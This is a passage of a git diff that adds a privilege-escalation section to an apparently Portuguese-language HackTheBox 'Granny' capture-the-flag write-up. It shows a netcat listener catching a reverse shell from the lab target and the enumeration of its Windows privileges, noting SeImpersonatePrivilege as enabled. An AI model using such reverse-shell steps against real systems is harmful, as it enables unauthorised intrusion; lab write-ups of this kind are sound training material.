@@ -112,3 +112,38 @@ Rapidamente conseguimos obter nossa reverse shell
 
 ![2.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-granny/2.jpg)
 
+## Privilege Escalation
+
+Usando a velha estrategia e funcional ja encontramos alguns vetores
+
+```
+root@kali:~/HTB-Windows/granny# rlwrap nc -nlvp 53
+listening on [any] 53 ...
+connect to [10.10.14.36] from (UNKNOWN) [10.10.10.15] 1032
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+c:\windows\system32\inetsrv>whoami
+whoami
+nt authority\network service
+
+c:\windows\system32\inetsrv>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAuditPrivilege              Generate security audits                  Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+
+c:\windows\system32\inetsrv>
+```
+
+
+
